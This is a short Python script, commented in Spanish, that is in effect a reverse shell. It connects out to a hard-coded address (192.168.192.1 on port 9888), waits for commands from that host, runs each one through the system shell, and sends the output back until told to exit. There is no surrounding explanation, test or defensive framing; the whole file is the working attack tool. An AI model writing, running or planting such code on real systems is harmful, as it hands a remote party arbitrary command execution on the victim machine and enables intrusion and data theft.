import socket
import subprocess
def run():
 
 clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 clientsocket.connect(("192.168.192.1", 9888))  # Reemplaza con la IP del cliente
 
 while True:
     # Espera recibir un comando desde el servidor
     command = clientsocket.recv(1024).decode('utf-8')
     if not command:
         break  # Si no se reciben datos, cierra la conexión
 
     if command.lower() == 'exit':
         break  # Si el comando es 'exit', cierra la conexión
 
     # Ejecuta el comando en el servidor y obtén el resultado
     result = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     output_bytes = result.stdout.read() + result.stderr.read()
     output_str = output_bytes.decode('utf-8', errors='replace')
 
     # Envía el resultado de vuelta al servidor
     clientsocket.send(output_str.encode('utf-8'))
 
 # Cierra la conexión del servidor después de manejar los comandos
 clientsocket.close()
 
 
  



